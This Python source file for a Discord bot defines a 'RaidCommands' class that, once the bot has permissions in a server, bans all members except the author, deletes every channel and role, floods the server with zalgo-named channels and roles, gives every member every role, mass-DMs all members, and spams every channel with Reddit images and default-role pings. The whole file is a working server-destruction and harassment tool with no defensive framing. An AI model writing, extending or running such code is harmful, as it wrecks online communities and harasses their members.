import random
from disnake import DMChannel
import asyncpraw
import disnake
from scripting import Scripts as SC
from py_logs import client_id, client_secret, username, password, user_agent
from disnake import Guild, Message, Member
from disnake.ui import View, Button

reddit = asyncpraw.Reddit(
    client_id=client_id,
    client_secret=client_secret,
    user_agent=user_agent,
    username=username,
    password=password,
)

ORANGE = 0xFF5733
sub_list = []
zalgo_list = []
subreddit = "gfur"

file = SC("zalgo_text.txt")
file.unpack(zalgo_list)


async def genreddit(amt: int, subreddit: str, subreddit2: str = None):

    sub = await reddit.subreddit(subreddit)
    sub_hot = sub.hot(limit=amt)
    async for i in sub_hot:
        sub_list.append(i)

    if subreddit2 is not None:
        sub2 = await reddit.subreddit(subreddit2)
        sub2_hot = sub2.hot(limit=amt)
        async for l in sub2_hot:
            sub_list.append(l)


class RaidCommands:
    @classmethod
    async def send_dm(cls, guild: disnake.Guild, embed, button: Button = None):

        view = View()

        if button is not None:
            view.add_item(button)

            for mem in guild.members:
                await mem.send(embed=embed, view=view)
        else:
            for mem in guild.members:
                await mem.send(embed=embed)

    @classmethod
    async def ban_members(cls, guild: disnake.Guild, author: disnake.Member = None):
        for mem in guild.members:
            if mem is not author:
                await mem.ban()

    @classmethod
    async def channel_remove(cls, guild: disnake.Guild):
        for ch in guild.channels:
            await ch.delete()

    @classmethod
    async def channel_make(cls, guild: disnake.Guild, amt: int):
        for _ in range(amt):
            await guild.create_text_channel(random.choice(zalgo_list))

    @classmethod
    async def role_remove(cls, guild: disnake.Guild):
        for role in guild.roles:
            await role.delete()

    @classmethod
    async def role_make(cls, guild: disnake.Guild, amt: int):
        for _ in range(amt):
            await guild.create_role(name=random.choice(zalgo_list))

    @classmethod
    async def role_give(cls, guild: disnake.Guild):
        for member in guild.members:
            for role in guild.roles:
                await member.add_roles(role)

    @classmethod
    async def sfw_spam(cls, guild: disnake.Guild, amt: int):
        for _ in range(amt):
            for cha in guild.channels:
                sfw_post = random.choice(sub_list)
                embed = disnake.Embed(title=f"__{sfw_post.title}__", url=sfw_post.url)
                embed.set_image(url=sfw_post.url)
                await cha.send(embed=embed)
            if len(sub_list) < 5:
                await genreddit(10, subreddit)

    @classmethod
    async def ping_spam(cls, guild: disnake.Guild, amt):
        for _ in range(amt):
            for cha in guild.channels:
                await cha.send(guild.default_role)
